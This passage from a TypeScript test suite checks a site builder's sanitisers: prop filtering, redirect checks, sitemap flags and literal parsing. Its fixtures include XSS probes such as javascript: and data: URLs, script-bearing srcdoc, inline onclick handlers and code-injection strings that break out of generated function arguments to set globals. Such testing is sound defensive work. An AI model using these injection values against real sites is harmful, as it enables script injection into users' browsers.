    expect(pagesAndTemplatesOf(undefined)).toEqual([]);
  });
});

describe("isPlainData", () => {
  test("is true for null, booleans, numbers, strings, and arrays and plain objects of them", () => {
    for (const value of [
      null,
      true,
      0,
      -1.5,
      NaN,
      Infinity,
      -Infinity,
      [NaN],
      "",
      "state",
      [],
      [1, "a", [null]],
      {},
      { a: 1, b: [{ c: "d" }] },
      Object.create(null),
    ]) {
      expect(isPlainData(value), JSON.stringify(value)).toBe(true);
    }
    // an object shared twice is still plain
    const shared = { a: 1 };
    expect(isPlainData([shared, shared])).toBe(true);
  });

  test("is false for anything else, wherever it is held", () => {
    class Thing {}
    const cyclic: Record<string, unknown> = {};
    cyclic.self = cyclic;
    const getter = Object.defineProperty({}, "x", { get: () => 1 });
    for (const [index, value] of [
      undefined,
      1n,
      Symbol("x"),
      () => 1,
      new Thing(),
      new Date(0),
      new Map(),
      /x/,
      globalThis,
      { a: () => 1 },
      [undefined],
      { a: new Thing() },
      Object.setPrototypeOf([1], {}),
      Object.setPrototypeOf([], Object.create(null)),
      cyclic,
      getter,
      { [Symbol("x")]: 1 },
    ].entries()) {
      expect(isPlainData(value), `value ${index}`).toBe(false);
    }
  });
});

describe("propMayShip", () => {
  const anywhere = [
    { component: "Link" },
    { component: "Box" },
    { component: "Image" },
    { component: elementComponent, tag: "a" },
    { component: elementComponent, tag: "iframe" },
    { component: elementComponent, tag: "img" },
    { component: elementComponent, tag: "object" },
    { component: radixTrigger },
  ];

  test("refuses an unsafe static href, xlink:href, src, action, formaction and data, in any spelling of the name, on any component", () => {
    const names = [
      "href",
      "HREF",
      "xlink:href",
      "xlinkHref",
      "src",
      "Src",
      "action",
      "formaction",
      "formAction",
    ];
    for (const instance of anywhere) {
      for (const name of names) {
        for (const value of ["javascript:alert(1)", "data:text/html,x"]) {
          expect(
            propMayShip(instance, staticProp(name, value)),
            `${instance.component} ${name}`
          ).toBe(false);
        }
        expect(
          propMayShip(instance, staticProp(name, "https://example.org"))
        ).toBe(true);
      }
    }
    // data is an address on an object, and on every holder but a holder of
    // records and a ws:element that is not an object
    for (const instance of [
      { component: elementComponent, tag: "object" },
      { component: "Box" },
      { component: radixTrigger },
    ]) {
      expect(
        propMayShip(instance, staticProp("DATA", "data:text/html,x"))
      ).toBe(false);
    }
  });

  test("ships page, asset, resource, action, number and boolean props", () => {
    const instance = { component: elementComponent, tag: "a" };
    const typed: Prop[] = [
      { id: "1", instanceId: "i", name: "href", type: "page", value: "page" },
      { id: "2", instanceId: "i", name: "src", type: "asset", value: "asset" },
      {
        id: "3",
        instanceId: "i",
        name: "action",
        type: "resource",
        value: "resource",
      },
      { id: "4", instanceId: "i", name: "action", type: "action", value: [] },
      { id: "5", instanceId: "i", name: "src", type: "number", value: 1 },
      { id: "6", instanceId: "i", name: "href", type: "boolean", value: true },
    ];
    for (const prop of typed) {
      expect(propMayShip(instance, prop), prop.type).toBe(true);
    }
  });

  test("refuses a bound address that decides nothing on Link, a ws:element a, form, button and iframe, and on a Radix trigger", () => {
    const bound: Array<[{ component: string; tag?: string }, string]> = [
      [{ component: "Link" }, "href"],
      [{ component: "RichTextLink" }, "href"],
      [{ component: elementComponent, tag: "a" }, "href"],
      [{ component: elementComponent, tag: "form" }, "action"],
      [{ component: elementComponent, tag: "button" }, "formaction"],
      [{ component: elementComponent, tag: "iframe" }, "src"],
      [{ component: elementComponent, tag: "svg" }, "xlink:href"],
      [{ component: radixTrigger }, "href"],
    ];
    for (const [instance, name] of bound) {
      const label = `${instance.tag ?? instance.component} ${name}`;
      expect(
        propMayShip(instance, staticProp(name, "x.url", "expression")),
        label
      ).toBe(false);
      expect(
        propMayShip(instance, {
          id: name,
          instanceId: "i",
          name,
          type: "parameter",
          value: "parameter",
        }),
        label
      ).toBe(false);
      // a fixed start that decides the scheme ships
      expect(
        propMayShip(
          instance,
          staticProp(name, '"/events/" + x.slug', "expression")
        ),
        label
      ).toBe(true);
    }
  });

  test("ships a bound src on Image and on img, video, audio, source, track and input, and a bound href on Head Link", () => {
    const parameter = (name: string): Prop => ({
      id: name,
      instanceId: "i",
      name,
      type: "parameter",
      value: "parameter",
    });
    const inert = [
      { component: "Image" },
      ...["img", "video", "audio", "source", "track", "input"].map((tag) => ({
        component: elementComponent,
        tag,
      })),
    ];
    for (const instance of inert) {
      expect(
        propMayShip(instance, staticProp("src", "x.url", "expression"))
      ).toBe(true);
      expect(propMayShip(instance, parameter("src"))).toBe(true);
      // a static value is still held to the rule
      expect(
        propMayShip(instance, staticProp("src", "data:image/png;base64,AAAA"))
      ).toBe(false);
    }
    expect(
      propMayShip(
        { component: "HeadLink" },
        staticProp("href", "x.url", "expression")
      )
    ).toBe(true);
    // the exemption is for that name on that holder only
    expect(
      propMayShip({ component: "Image" }, staticProp("href", "x", "expression"))
    ).toBe(false);
    expect(
      propMayShip(
        { component: elementComponent, tag: "embed" },
        staticProp("src", "x", "expression")
      )
    ).toBe(false);
    expect(
      propMayShip({ component: "Video" }, staticProp("src", "x", "expression"))
    ).toBe(false);
  });

  test("ships data of any type and shape on Collection, Signup Form, RSVP Form and a ws:element that is not an object, and judges it on an object, a Box and a Radix trigger", () => {
    const shapes: Prop[] = [
      staticProp("data", "javascript:alert(1)"),
      staticProp("data", "x", "expression"),
      {
        id: "json",
        instanceId: "i",
        name: "data",
        type: "json",
        value: ["javascript:alert(1)"],
      },
      {
        id: "list",
        instanceId: "i",
        name: "data",
        type: "string[]",
        value: ["javascript:alert(1)"],
      },
      {
        id: "parameter",
        instanceId: "i",
        name: "data",
        type: "parameter",
        value: "parameter",
      },
    ];
    for (const instance of [
      { component: "ws:collection" },
      { component: "@organizeos/site-components:SignupForm" },
      { component: "@organizeos/site-components:RsvpForm" },
      { component: elementComponent, tag: "div" },
      { component: elementComponent },
    ]) {
      for (const prop of shapes) {
        expect(propMayShip(instance, prop), instance.component).toBe(true);
      }
    }
    for (const instance of [
      { component: elementComponent, tag: "object" },
      { component: "Box" },
      { component: radixTrigger },
    ]) {
      for (const prop of shapes) {
        expect(
          propMayShip(instance, prop),
          `${instance.component} ${prop.type}`
        ).toBe(false);
      }
      expect(
        propMayShip(instance, {
          id: "json",
          instanceId: "i",
          name: "data",
          type: "json",
          value: { records: [] },
        })
      ).toBe(true);
    }
  });

  test("refuses a string[] and a json href and data on an object that join into a javascript: address", () => {
    const object = { component: elementComponent, tag: "object" };
    for (const name of ["href", "data"]) {
      for (const type of ["json", "string[]"] as const) {
        expect(
          propMayShip(object, {
            id: name,
            instanceId: "i",
            name,
            type,
            value: ["javascript:alert(1)"],
          } as Prop),
          `${type} ${name}`
        ).toBe(false);
        expect(
          propMayShip(object, {
            id: name,
            instanceId: "i",
            name,
            type,
            value: ["https://example.org"],
          } as Prop)
        ).toBe(true);
      }
    }
  });

  test("judges an animation's action by its value, so an Animate Children keeps it", () => {
    // upstream's animationAction holds an animation's settings: an object,
    // which React would write as [object Object]
    expect(
      propMayShip(
        { component: "@organizeos/site-components:AnimateChildren" },
        {
          id: "action",
          instanceId: "i",
          name: "action",
          type: "animationAction",
          value: { type: "view", animations: [] },
        }
      )
    ).toBe(true);
  });

  test("refuses every srcdoc, and every on… prop that is not an action", () => {
    for (const instance of anywhere) {
      for (const name of ["srcdoc", "srcDoc", "SRCDOC"]) {
        expect(propMayShip(instance, staticProp(name, "<p>hi</p>"))).toBe(
          false
        );
        expect(propMayShip(instance, staticProp(name, "x", "expression"))).toBe(
          false
        );
      }
      for (const name of ["onclick", "onMouseOver", "ONERROR", "on-x"]) {
        expect(propMayShip(instance, staticProp(name, "alert(1)"))).toBe(false);
        expect(propMayShip(instance, staticProp(name, "x", "expression"))).toBe(
          false
        );
        expect(
          propMayShip(instance, {
            id: name,
            instanceId: "i",
            name,
            type: "action",
            value: [],
          })
        ).toBe(true);
      }
    }
    // "on" alone names no handler; any longer name that starts with it is
    // held to the rule, as a custom element would read it
    expect(propMayShip({ component: "Box" }, staticProp("on", "x"))).toBe(true);
    expect(propMayShip({ component: "Box" }, staticProp("one", "x"))).toBe(
      false
    );
    expect(propMayShip({ component: "Box" }, staticProp("id", "x"))).toBe(true);
  });

  // The generator writes an action as code on any prop, of any component, on
  // any page: the server renders it too, an XML page included
  test("refuses an action that may not run, whatever its name and on any component, XML Node and XML Time included, and ships one that may", () => {
    const crafted = actionProp([
      { args: [") => 0, globalThis.pwned = 1, (x"], code: "0" },
    ]).value;
    // a variable set with no args, which any prop may do
    const accepted = actionProp([
      { args: [], code: `${encodeDataSourceVariable("v")} = 1` },
    ]).value;
    const context: ActionContext = {
      instances: new Map(),
      pageRootIds: new Set(),
      dataSources: new Map([
        [
          "v",
          { type: "variable", scopeInstanceId: ROOT_INSTANCE_ID, name: "v" },
        ],
      ]),
    };
    for (const instance of [
      ...anywhere,
      { component: collectionComponent },
      { component: "XmlNode" },
      { component: "XmlTime" },
    ]) {
      for (const name of [
        "onClick",
        "onStateChange",
        "href",
        "action",
        "src",
        "data",
        "value",
      ]) {
        const prop = (value: ActionProp["value"]): ActionProp => ({
          id: name,
          instanceId: "i",
          name,
          type: "action",
          value,
        });
        expect(
          propMayShip(instance, prop(crafted)),
          `${instance.component} ${name}`
        ).toBe(false);
        expect(
          propMayShip(instance, prop(accepted), false, context),
          `${instance.component} ${name}`
        ).toBe(true);
        expect(propMayShip(instance, prop(crafted), true)).toBe(true);
      }
    }
  });

  test("refuses an action that reads a member while paused, and ships it when org script may run", () => {
    const prop: ActionProp = {
      ...actionProp(
        [
          {
            args: ["state"],
            code: `${encodeDataSourceVariable("v")} = state.length`,
          },
        ],
        "onStateChange"
      ),
      instanceId: "form",
    };
    const context: ActionContext = {
      instances: new Map([
        [
          "form",
          {
            component: "@organizeos/site-components:SignupForm",
            children: [],
          },
        ],
      ]),
      pageRootIds: new Set(["form"]),
      dataSources: new Map([
        ["v", { type: "variable", scopeInstanceId: "form", name: "v" }],
      ]),
    };
    expect(propMayShip({ component: "Box" }, prop, false, context)).toBe(false);
    expect(propMayShip({ component: "Box" }, prop, true, context)).toBe(true);
  });

  test("ships a Collection's item and key only as a parameter", () => {
    const list = { component: collectionComponent };
    const value = (type: Prop["type"], v: unknown, name = "item") =>
      ({ id: "p", instanceId: "list", name, type, value: v }) as Prop;
    for (const name of ["item", "itemKey"]) {
      expect(
        propMayShip(list, value("parameter", "item", name), false),
        name
      ).toBe(true);
      for (const prop of [
        value("expression", "$ws$dataSource$item", name),
        value("string", "x", name),
        value("json", [], name),
        value("number", 1, name),
      ]) {
        expect(propMayShip(list, prop, false), `${name} ${prop.type}`).toBe(
          false
        );
      }
    }
    // on any other component, and when the switch is on
    expect(propMayShip({ component: "Box" }, value("string", "x"), false)).toBe(
      true
    );
    expect(propMayShip(list, value("string", "x"), true)).toBe(true);
  });

  test("refuses an action that names a data source when it is given none", () => {
    const prop = actionProp([
      { args: [], code: `${encodeDataSourceVariable("v")} = 1` },
    ]);
    expect(propMayShip({ component: "Box" }, prop, false)).toBe(false);
  });

  test("ships every other prop of XML Node and XML Time", () => {
    for (const component of ["XmlNode", "XmlTime"]) {
      for (const prop of [
        staticProp("href", "javascript:alert(1)"),
        staticProp("onmouseover", "alert(1)"),
        staticProp("srcdoc", "<script>alert(1)</script>"),
        staticProp("href", "x.url", "expression"),
      ]) {
        expect(propMayShip({ component }, prop), prop.name).toBe(true);
      }
    }
  });

  test("ships everything when the switch is on", () => {
    expect(
      propMayShip(
        { component: "Link" },
        staticProp("href", "javascript:alert(1)"),
        true
      )
    ).toBe(true);
    expect(
      propMayShip({ component: "Box" }, staticProp("srcdoc", "<p>"), true)
    ).toBe(true);
    expect(
      propMayShip({ component: "Box" }, staticProp("onclick", "x"), true)
    ).toBe(true);
  });
});

describe("pageRedirectMayShip and projectRedirectMayShip", () => {
  test("refuse a javascript: or data: target, static or bound, and allow a page path or an https target", () => {
    const page = (redirect?: string) => ({ meta: { redirect } });
    expect(pageRedirectMayShip(page())).toBe(true);
    expect(pageRedirectMayShip(page('""'))).toBe(true);
    expect(pageRedirectMayShip(page('"/about"'))).toBe(true);
    expect(pageRedirectMayShip(page('"https://example.org"'))).toBe(true);
    expect(pageRedirectMayShip(page('"/events/" + x.slug'))).toBe(true);
    expect(pageRedirectMayShip(page('"javascript:alert(1)"'))).toBe(false);
    expect(pageRedirectMayShip(page('"data:text/html,x"'))).toBe(false);
    expect(pageRedirectMayShip(page("x.url"))).toBe(false);
    expect(pageRedirectMayShip(page('"javascript:" + x'))).toBe(false);
    expect(pageRedirectMayShip(page('"javascript:alert(1)"'), true)).toBe(true);

    const redirect = (target: string) => ({ old: "/go", new: target });
    expect(projectRedirectMayShip(redirect("/about"))).toBe(true);
    expect(projectRedirectMayShip(redirect("https://example.org"))).toBe(true);
    expect(projectRedirectMayShip(redirect("javascript:alert(1)"))).toBe(false);
    expect(projectRedirectMayShip(redirect(" JAVASCRIPT:alert(1)"))).toBe(
      false
    );
    expect(projectRedirectMayShip(redirect("data:text/html,x"))).toBe(false);
    expect(projectRedirectMayShip(redirect("javascript:x"), true)).toBe(true);
  });
});

describe("withoutPausedProps", () => {
  const link = { component: "Link" };

  test("drops what withoutBlockedTagProps drops", () => {
    expect(
      withoutPausedProps(
        { component: "Box" },
        { "data-ws-tag": "script", tag: "SCRIPT", id: "a" }
      )
    ).toEqual({ id: "a" });
    const props = { "data-ws-tag": "script", tag: "urlset" };
    expect(withoutPausedProps({ component: "XmlNode" }, props)).toBe(props);
  });

  test("drops an evaluated unsafe address, a srcdoc and an on… value that is not a function", () => {
    expect(
      withoutPausedProps(
        { component: elementComponent, tag: "iframe" },
        {
          id: "a",
          src: " JaVaScRiPt:window.pwned = 1",
          srcDoc: "<script>window.pwned = 1</script>",
          srcdoc: 1,
          onclick: "window.pwned = 1",
          onMouseOver: true,
          formAction: "data:text/html,x",
          xlinkHref: "javascript:1",
          ACTION: "vbscript:1",
        }
      )
    ).toEqual({ id: "a" });
  });

  test("keeps functions and safe addresses, and data of any value on a Collection, a Signup Form and a ws:element div", () => {
    const onClick = () => {};
    const props = {
      href: "https://example.org",
      src: "/a.png",
      action: "mailto:a@example.org",
      formAction: "#b",
      onClick,
      onValueChange: onClick,
      title: "javascript:alert(1)",
      onclick: undefined,
    };
    expect(withoutPausedProps(link, props)).toBe(props);
    for (const instance of [
      { component: "ws:collection" },
      { component: "@organizeos/site-components:SignupForm" },
      { component: elementComponent, tag: "div" },
    ]) {
      const records = { data: ["javascript:alert(1)"] };
      expect(withoutPausedProps(instance, records)).toBe(records);
    }
  });

  test("refuses a string[] and a json href and data on an object that join into a javascript: address", () => {
    const object = { component: elementComponent, tag: "object" };
    expect(
      withoutPausedProps(object, {
        data: ["javascript:window.pwned = 1"],
        href: [["javascript:window.pwned = 1"]],
        id: "o",
      })
    ).toEqual({ id: "o" });
    // data is judged by its holder, never by the value's shape
    expect(
      withoutPausedProps(
        { component: "Box" },
        { data: ["data:text/html,x"], id: "b" }
      )
    ).toEqual({ id: "b" });
    expect(withoutPausedProps(object, { data: { a: 1 } })).toEqual({
      data: { a: 1 },
    });
  });

  test("returns the same object when nothing goes, and never changes its input", () => {
    const kept = { href: "/a", id: "a" };
    expect(withoutPausedProps(link, kept)).toBe(kept);
    const props = {
      href: "javascript:alert(1)",
      "data-ws-tag": "script",
      id: "a",
    };
    const copy = { ...props };
    const result = withoutPausedProps({ component: "Box" }, props);
    expect(result).toEqual({ id: "a" });
    expect(props).toEqual(copy);
  });

  test("returns its input when the switch is on", () => {
    const props = {
      href: "javascript:alert(1)",
      srcDoc: "<script></script>",
      onclick: "x",
      "data-ws-tag": "script",
    };
    expect(withoutPausedProps({ component: "Box" }, props, true)).toBe(props);
  });
});

describe("sitemapExcludesPage", () => {
  test("excludes a page only for the literal true", () => {
    expect(sitemapExcludesPage("true")).toBe(true);
    expect(sitemapExcludesPage(" true ")).toBe(true);
    expect(sitemapExcludesPage("(true)")).toBe(true);
    expect(sitemapExcludesPage("true // note")).toBe(true);
    expect(sitemapExcludesPage("true /* note */")).toBe(true);
    expect(sitemapExcludesPage("(true) // note")).toBe(true);
    expect(sitemapExcludesPage("true\n//")).toBe(true);
  });

  test("keeps every other value listed", () => {
    for (const value of [
      undefined,
      "",
      "false",
      '"true"',
      "1",
      "$ws$dataSource$id",
      "true && true",
      "true /*",
      "true; false",
      "!false",
      "(",
    ]) {
      expect(sitemapExcludesPage(value)).toBe(false);
    }
  });

  test("evaluates nothing", () => {
    const marker = "__organizeosSitemapMarker";
    const globals = globalThis as Record<string, unknown>;
    try {
      expect(sitemapExcludesPage(`(globalThis.${marker} = true)`)).toBe(false);
      expect(globals[marker]).toBeUndefined();
    } finally {
      delete globals[marker];
    }
  });
});

describe("pagesForSitemap", () => {
  const page = (id: string, excludePageFromSearch?: string): Page => ({
    id,
    name: id,
    title: `"${id}"`,
    path: `/${id}`,
    rootInstanceId: `${id}-root`,
    meta: { excludePageFromSearch },
  });
  const pages: Pages = {
    meta: { siteName: "Site" },
    homePageId: "home",
    rootFolderId: "root",
    pages: new Map([
      ["home", page("home")],
      ["hidden", page("hidden", "true")],
      ["bound", page("bound", "$ws$dataSource$id")],
      ["code", page("code", "(globalThis.x = true)")],
    ]),
    folders: new Map(),
  } as unknown as Pages;

  test("keeps the literal true and drops every other value", () => {
    const result = pagesForSitemap(pages);
    expect(
      Array.from(result.pages.values(), (item) => [
        item.id,
        item.meta.excludePageFromSearch,
      ])
    ).toEqual([
      ["home", undefined],
      ["hidden", "true"],
      ["bound", undefined],
      ["code", undefined],
    ]);
  });

  test("changes neither the pages passed in nor anything but the setting", () => {
    const before = structuredClone(pages);
    const result = pagesForSitemap(pages);
    expect(pages).toEqual(before);
    const withoutSetting = (value: Pages) => ({
      ...value,
      pages: Array.from(value.pages, ([id, item]) => [
        id,
        { ...item, meta: { ...item.meta, excludePageFromSearch: undefined } },
      ]),
    });
    expect(withoutSetting(result)).toEqual(withoutSetting(pages));
  });
});

describe("readLiteralValue", () => {
  test("reads JSON and the literal forms the variable dialog writes", () => {
    expect(readLiteralValue(`{"a": [1, "b", true, null]}`)).toEqual({
      value: { a: [1, "b", true, null] },
    });
    expect(readLiteralValue(`{ a: 1, "b c": -2.5, 3: \`x\` }`)).toEqual({
      value: { a: 1, "b c": -2.5, "3": "x" },
    });
    expect(readLiteralValue(` ["x", "y"] `)).toEqual({ value: ["x", "y"] });
    expect(readLiteralValue(`undefined`)).toEqual({ value: undefined });
    expect(readLiteralValue(`"text"`)).toEqual({ value: "text" });
    // as the builder formats an object, in parentheses
    expect(readLiteralValue(`({\n  "a": 1\n})`)).toEqual({ value: { a: 1 } });
  });

  test("keeps a __proto__ key as an own property", () => {
    const read = readLiteralValue(`{"__proto__": {"x": 1}}`);
    const value = read?.value as Record<string, unknown>;
    expect(Object.getPrototypeOf(value)).toBe(Object.prototype);
    expect(Object.hasOwn(value, "__proto__")).toBe(true);
  });

  test.each([
    `a`,
    `f()`,
    `[1].map(String)`,
    `{ a: b }`,
    `{ a }`,
    `{ [k]: 1 }`,
    `{ get a() { return 1 } }`,
    `{ a() {} }`,
    `[...a]`,
    `[1, , 2]`,
    `/x/`,
    `1n`,
    `\`\${a}\``,
    `-a`,
    `!1`,
    `1 + 1`,
    `1) || (2`,
    `1), (globalThis.x = 1`,
    `1); (2`,
    `1 /* x */) || (2`,
    `1; 2`,
    `1 // x`,
    `() => 1`,
    ``,
  ])("refuses %s", (text) => {
    expect(readLiteralValue(text)).toBeUndefined();
  });
});
